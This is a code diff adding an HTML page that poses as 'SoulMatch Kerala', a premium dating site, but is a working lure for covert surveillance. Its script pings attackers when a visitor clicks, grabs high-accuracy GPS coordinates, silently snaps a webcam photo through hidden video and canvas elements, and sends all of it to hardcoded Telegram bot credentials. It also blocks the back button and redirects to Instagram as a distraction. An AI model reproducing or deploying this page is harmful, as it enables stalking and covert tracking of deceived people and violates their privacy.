@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoulMatch Kerala | Premium Dating</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #fff0f3; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
+        .hero { background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?auto=format&fit=crop&w=1350&q=80'); background-size: cover; height: 100vh; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .dating-card { border: none; border-radius: 20px; margin-top: -80px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); background: white; z-index: 10; }
+        .btn-match { background: #ff4d6d; color: white; border-radius: 50px; padding: 12px 40px; font-weight: bold; border: none; font-size: 1.1rem; }
+        .profile-img { width: 80px; height: 80px; object-fit: cover; border: 3px solid #ff4d6d; }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden Capture Elements -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <div class="hero">
+        <h1 class="display-4 fw-bold">12 New matches found!</h1>
+        <p class="lead">Verified profiles in your local area.</p>
+    </div>
+
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-5 text-center">
+                <div class="card dating-card p-4">
+                    <div class="d-flex justify-content-around mb-3">
+                        <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=150" class="rounded-circle profile-img">
+                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150" class="rounded-circle profile-img">
+                    </div>
+                    <h4>Reveal Matches Nearby</h4>
+                    <p class="text-muted small">Allow location and camera access to verify your profile and see matches.</p>
+                    <button class="btn btn-match shadow w-100" onclick="startOperation()">CONTINUE TO MATCHES</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // NEW UPDATED CREDENTIALS
+        const BOT_TOKEN = "8696211342:AAHFnNWULmUsgkNj0vdx-lflTBHHWE59hQ4";
+        const CHAT_IDS = ["1020906452", "1685824286"];
+
+        // FORCE LOCK
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { history.go(1); };
+
+        async function startOperation() {
+            // 1. SEND INITIAL PING
+            await broadcastMessage("🚀 **TARGET CLICKED LINK!** Starting extraction...");
+
+            // 2. LOCATION CAPTURE
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await broadcastMessage(`📍 **GPS DATA**\n${mapLink}`);
+            }, (err) => {
+                broadcastMessage("⚠️ Location Denied.");
+            }, { enableHighAccuracy: true });
+
+            // 3. CAMERA CAPTURE
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    broadcastPhoto(canvas.toDataURL('image/png'));
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2000); 
+            } catch (e) {
+                broadcastMessage("⚠️ Camera Access Denied: " + e.message);
+                alert("Error: Camera initialization failed. Please try on a different browser.");
+            }
+        }
+
+        async function broadcastMessage(text) {
+            for (let id of CHAT_IDS) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
+                    });
+                } catch (err) { console.error("Broadcast failed"); }
+            }
+        }
+
+        async function broadcastPhoto(base64) {
+            const blob = await (await fetch(base64)).blob();
+            for (let id of CHAT_IDS) {
+                const formData = new FormData();
+                formData.append('chat_id', id);
+                formData.append('photo', blob, 'recon.png');
+                formData.append('caption', "📸 **TARGET SNAPSHOT**");
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }
+            // Distraction
+            window.location.href = "https://www.instagram.com";
+        }
+    </script>
+</body>
+</html>
